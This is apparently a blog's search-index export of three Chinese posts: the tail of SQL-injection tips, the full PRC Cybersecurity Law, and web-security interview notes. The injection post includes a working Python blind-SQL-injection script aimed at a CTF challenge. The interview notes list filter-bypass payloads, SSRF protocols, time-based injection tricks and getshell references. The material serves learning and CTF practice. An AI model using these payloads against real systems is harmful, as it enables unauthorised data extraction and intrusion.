indexOfChar + &quot;,1)))&gt;&quot; + mid + &quot;)&quot; payload = startStr + payload + endStr return payload 花式盲注ciscn_2019_web_northern_china_day2_web1import timeimport requestsurl = &apos;http://7ccdf96a-66d5-4601-a1f0-4a3cba45893c.node3.buuoj.cn/index.php&apos;flag = &apos;&apos;for i in range(32,50): #从33到126为可打印的字符 low = 33 height = 126 data = {&apos;id&apos;:&apos;&apos;} while low &lt;= height : mid = (low + height) // 2 data[&apos;id&apos;] = &apos;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&apos;%(i,mid) html = requests.post(url,data).text time.sleep(1) if &apos;Hello&apos; in html : low = mid + 1 else: #将小于和等于的情况一起考虑，所以在low~mid中间寻找 height = mid #出现low = height = mid，若不判断会进入死循环 if height == mid == low: break flag += chr(int(mid)) print(flag)","link":"2019/11/22/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9Btip/"},{"title":"网络安全法","text":"听说不懂法的人是没法搞安全的，所以有空还是认真看一看（认真脸）。 目录 第一章 总则 第二章 网络安全支持与促进 第三章 网络运行安全 第一节 一般规定 第二节 关键信息基础设施的运行安全 第四章 网络信息安全 第五章 监测预警与应急处置 第六章 法律责任 第七章 附 则 条文 第一章 总 则 第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。 县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。 第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 第十二条 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。 任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 第十三条 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 第十四条 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 第二章 网络安全支持与促进 第十五条 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。 国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。 第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。 第十七条 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 第十八条 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。 大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 第二十条 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 第三章 网络运行安全 第一节 一般规定 第二十一条 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改： （一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； （二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； （三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； （四）采取数据分类、重要数据备份和加密等措施； （五）法律、行政法规规定的其他义务。 第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。 网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。 国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。 第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。 有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。 第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： （一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； （二）定期对从业人员进行网络安全教育、技术培训和技能考核； （三）对重要系统和数据库进行容灾备份； （四）制定网络安全事件应急预案，并定期进行演练； （五）法律、行政法规规定的其他义务。 第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： （一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估； （二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力； （三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享； （四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 第四章 网络信息安全 第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。 网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。 网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。 电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。 第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。 第五章 监测预警与应急处置 第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。 负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。 网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施： （一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； （二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； （三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。 第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。 第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 第六章 法律责任 第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。 关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： （一）设置恶意程序的； （二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； （三）擅自终止为其产品、服务提供安全维护的。 第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。 第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。 违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。 单位有欠款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款： （一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； （二）拒绝、阻碍有关部门依法实施的监督检查的； （三）拒不向公安机关、国家安全机关提供技术支持和协助的。 第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。 网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。 违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。 第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。 第七章附 则 第七十六条 本法下列用语的含义： （一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 （二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 （三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 （四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 （五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。 第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。 第七十八条 军事网络的安全保护，由中央军事委员会另行规定。 第七十九条 本法自2017年6月1日起施行。","link":"2019/01/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"},{"title":"web安全面经积累","text":"一、安全 1、PHP 作为弱类型语言，在底层它是怎么判断变量的类型的 2、SQL 注入时有哪些替代空格 3、xss与csrf区别 4、啥是同源策略，跨域有几种方式 5、jsonp 6、内容安全策略（CSP） 7、SSRF漏洞原理是什么？利用时有哪些伪协议 8、云waf 9、链路层劫持 10、如何绕过cdn，获取真实ip 11、ARP攻击 12、HTTPS原理，以及加密、解密的原理 13、MYSQL5.7中的安全特性 14、MYSQL加密方式 15、localStorage,sesseionStorage 16、HQL注入 17、order by 注入 18、 limit 注入 19、PHP文件包含–session 20、IIS短文件名漏洞 21、SSRF无回显 22、redis未授权getshell 23、phar+反序列化 23、http-only绕过方法 24、PHP5.5 ~ PHP7.2 新特性 25、OWASP-top10 26、GOpher协议 27、文件名解析漏洞 28、java安全 29、后渗透 30、FastJson反序列化 31、DNSlog 32、iptables 33、JavaScript 原型链污染 34、websocket 35、一些cms漏洞分析 36、免杀 37、sql注入防御 38、一次有趣的绕过 39、linux下passwd和shadow区别 二、python 1、PYTHON三大神器：装饰器，迭代器，生成器 2、标准库线程安全的队列是哪一个？不安全的是哪一个？logging是线程安全的吗？ 三、后渗透 1、mysql提权 四、其他 数据库设计的三大范式 参考 一、安全1、PHP 作为弱类型语言，在底层它是怎么判断变量的类型的PHP 作为弱类型语言，在底层它是怎么判断变量的类型的 2、SQL 注入时有哪些替代空格/**/替代空格and(1=0)括号绕过%09 %0A %0D +都可以替代空格绕过 3、xss与csrf区别CSRF：无法获取受害者的cookie，无法看到cookie； 只是利用受害者是被服务器信任的（靠验证cookie），而给服务器发送请求；XSS：利用cookie只是xss的一种体现，xss还可以篡改网页、URL跳转等等；跨站脚本，脚本可以做什么，xss就可以做什么；单在利用cookie上来说：获取受害者的cookie，从而得到服务器的信任，进行后续攻击获取手段是反射、存储、dom 4、啥是同源策略，跨域有几种方式https://blog.csdn.net/lsg14215/article/details/102753275https://www.jianshu.com/p/203217977b22跨域1、通过jsonp请求 2、通过服务器代理进行跨域请求 5、jsonphttps://www.runoob.com/json/json-jsonp.htmljsonp是jquery提供的跨域方式cors是w3c提供的一个跨域标准jsonp只支持get方式的跨域cors支持get和post方式的跨域 6、内容安全策略（CSP）https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directiveshttps://blog.csdn.net/qq_37943295/article/details/79978761 7、SSRF漏洞原理是什么？利用时有哪些伪协议SSRF漏洞原理是什么？利用时有哪些伪协议原理：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。ssrf用处：探测内网信息,用协议探ftp%26ip={ip}%26port={port}，攻击内网或本地其他服务，穿透防火墙利用协议：curl,file://,Dict://,SFTP://,TFTP://,LDAP://,Gopher:// 8、云waf云WAF部署在web应用程序前面，在用户请求到达web服务器前对用户请求进行扫描和过滤，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离。通过检查HTTP流量，可以防止源自web应用程序的安全漏洞（如SQL注入，跨站脚本攻击，文件包含和安全配置错误）的攻击。https://www.cnblogs.com/bmjoker/p/8806214.htmlhttps://www.idcbest.com/idcnews/11003330.html 9、链路层劫持链路层劫持是指第三方（可能是运营商、黑客）通过在用户至服务器之间，植入恶意设备或者控制网络设备的手段，侦听或篡改用户和服务器之间的数据，达到窃取用户重要数据（包括用户密码，用户身份数据等等）的目的。链路层劫持最明显的危害就是帐号、密码被窃取。http://www.sohu.com/a/84898660_188485 10、如何绕过cdn，获取真实ip如何绕过cdn，获取真实ip 1、二级域名法2、nslookup例如：nslookup http://xxx.com 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一3、第三方搜索，fofa,凌波微步4、phpinfo，rss订阅 11、ARP攻击https://blog.csdn.net/zhydream77/article/details/85334042 12、HTTPS原理，以及加密、解密的原理HTTPS原理，以及加密、解密的原理https://www.jianshu.com/p/e30a8c4fa329HTTPS = HTTP + SSL 13、MYSQL5.7中的安全特性https://blog.csdn.net/bamuta/article/details/52213660http://www.imooc.com/article/47820https://blog.csdn.net/weixin_33805992/article/details/86132485https://www.cnblogs.com/zhoujinyi/p/5627494.html 5.7版本的用户表mysql.user要求plugin字段非空，且默认值是mysql_native_password认证插件，并且不再支持mysql_old_password认证插件。5.7用户长度最大为32字节，之前最大长度为16字节，并且CREATE USER 和 DROP USER 命令里实现了 IF [NOT] EXISTS 条件判断。5.7之后用户通过grant创建用户报warning 14、MYSQL加密方式https://www.cnblogs.com/ichunqiu/p/7810914.htmlMYSQL数据库的认证密码有两种方式，MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密，MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询，前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 show create user dxy@localhost;+----------------------------------------------------------------------------------+| CREATE USER &apos;dxy&apos;@&apos;localhost&apos; IDENTIFIED WITH &apos;mysql_native_password&apos; AS &apos;*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9&apos; REQUIRE NONE PASSWORD EXPIRE DEFAULT ACCOUNT UNLOCK |+----------------------------------------------------------------------------------+ 15、localStorage,sesseionStoragehttps://jerryzou.com/posts/cookie-and-web-storage/sessionStorage和localStorage不会把数据发给服务器，仅在本地保存 cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭 sessionStorage：仅在当前浏览器窗口关闭前有效 localStorage 始终有效，长期保存 1、cookie本身用于客户端和服务端通信，但是它有本地存储的功能，于是就被“借用”，document.cookie = …获取和修改即可，cookie用于存储的缺点存储量太小，只有4kb所有http请求都带着，会影响获取资源的效率api简单，需要封装才能用document.cookie2、localStorage,sesseionStoragehtml5专门为存储而设计，最大容量5M，api简单易用，lcoalStorage.setItem(key, value);localStorage.getItem(key);，ios safari隐藏模式下:localStorage.getItem会报错，建议统一使用try-catch封装3、sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。而localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 16、HQL注入Hibernate HQL注入与防御(ctf实例) 17、order by 注入https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html 18、 limit 注入https://www.jianshu.com/p/6c1420a7a7d9不存在 order by 关键字:这种情况下的 limit 后面可以使用union进行联合查询注入存在 order by 关键字会报错：limit 关键字后面还可跟PROCEDURE和 INTO两个关键字，但是 INTO 后面写入文件需要知道绝对路径以及写入shell的权限，因此利用比较难，因此这里以PROCEDURE为例进行注入mysql时间盲注一般都怎么注? 最简单的就是sleep了，用if(1=1,sleep(5),0) benchmark函数 heavy query 笛卡尔积 —-&gt;具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟 get_lock GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，一个客户端对某个字段加锁以后另一个客户端再想对这个字段加锁就会失败，然后就会等待设定好的时间 19、PHP文件包含–sessionhttps://www.cnblogs.com/Oran9e/p/8082962.html利用条件：session文件路径已知，且其中内容部分可控。文件包含：伪协议，session，包含日志，包含environ，包含fd，包含临时文件，包含上传文件 20、IIS短文件名漏洞IIS短文件名漏洞https://www.freebuf.com/articles/web/172561.html 21、SSRF无回显https://xz.aliyun.com/t/6373#toc-2Bool型 22、redis未授权getshellssrf打内网redis未授权getshellhttps://www.cnblogs.com/zuoxiaolongzzz/p/8945413.html 